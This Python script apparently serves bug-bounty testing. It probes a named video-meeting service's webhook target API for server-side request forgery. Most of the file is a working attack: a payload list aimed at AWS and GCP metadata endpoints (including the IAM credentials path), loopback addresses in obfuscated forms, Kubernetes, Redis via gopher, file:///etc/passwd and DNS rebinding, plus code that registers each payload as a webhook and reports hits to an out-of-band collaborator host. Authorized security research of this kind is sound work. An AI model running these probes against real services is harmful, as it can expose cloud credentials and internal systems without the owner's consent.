#!/usr/bin/env python3
"""
Webhook SSRF probe for jaas.8x8.vc target-manager.

Workflow:
1. Get a Burp Collaborator / interactsh / webhook.site URL.
2. Fill TOKEN and COLLAB_BASE below.
3. Run, then trigger an event (e.g., start a recording in your tenant) so the
   webhook actually fires. The script just creates the targets.

Each created target is tagged so you know which payload triggered which DNS hit.
Compliance: do not run high-volume, do not target real customer infra, only
your own tenant. Add X-HackerOne header per program rules.
"""
import json
import time
import requests

H1_USERNAME = "blackboxops"
TOKEN       = "eyJ...your_attacker_token..."
COLLAB_BASE = "https://YOUR.oastify.com"   # or interactsh / webhook.site
TARGETS_URL = "https://jaas.8x8.vc/meet-external/target-manager/v1/targets"


def hdrs():
    return {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": f"Caido X-HackerOne: {H1_USERNAME}",
        "X-HackerOne": H1_USERNAME,
    }


# Each tuple: (label, url to set as webhook target)
PAYLOADS = [
    ("collab_baseline",      f"{COLLAB_BASE}/baseline"),
    ("aws_imds_v1",          "http://169.254.169.254/latest/meta-data/"),
    ("aws_imds_iam",         "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("gcp_metadata",         "http://metadata.google.internal/computeMetadata/v1/"),
    ("loopback_80",          "http://127.0.0.1:80/"),
    ("loopback_8080",        "http://127.0.0.1:8080/"),
    ("loopback_v6",          "http://[::1]:80/"),
    ("zero_addr",            "http://0.0.0.0:80/"),
    ("decimal_ip",           "http://2130706433/"),                     # 127.0.0.1
    ("octal_ip",             "http://0177.0.0.1/"),
    ("subdomain_loopback",   "http://localhost.YOUR.oastify.com/"),    # split-horizon DNS
    ("redirect_via_collab",  f"{COLLAB_BASE}/redir-to-internal"),       # set 302 -> 127.0.0.1 there
    ("dns_rebind",           f"http://rebind.YOUR.oastify.com/"),
    ("gopher_scheme",        "gopher://127.0.0.1:6379/_INFO"),
    ("file_scheme",          "file:///etc/passwd"),
    ("internal_dns_aws",     "http://internal-elb.eu-west-1.elb.amazonaws.com/"),
    ("k8s_api",              "https://kubernetes.default.svc/"),
]


def create_target(label: str, url: str):
    body = {
        "name": f"sec-test-{label}-{int(time.time())}",
        "url": url,
        "eventTypes": [
            "RECORDING_STARTED", "RECORDING_ENDED",
            "PARTICIPANT_JOINED", "PARTICIPANT_LEFT",
            "ROOM_CREATED", "ROOM_DESTROYED",
        ],
    }
    r = requests.post(TARGETS_URL, headers=hdrs(), data=json.dumps(body), timeout=15)
    print(f"[{r.status_code}] {label:24} -> {url}")
    if r.status_code >= 400:
        print(f"   body: {r.text[:300]}")
    return r


def list_targets():
    r = requests.get(TARGETS_URL, headers=hdrs(), timeout=15)
    print("Existing targets:", r.status_code, len(r.text))
    print(r.text[:2000])


if __name__ == "__main__":
    list_targets()
    print("\n--- creating SSRF probes ---")
    for label, url in PAYLOADS:
        create_target(label, url)
        time.sleep(1)   # be polite, program asks for low volume
    print("\nNow trigger a recording in your tenant and watch your collaborator.")
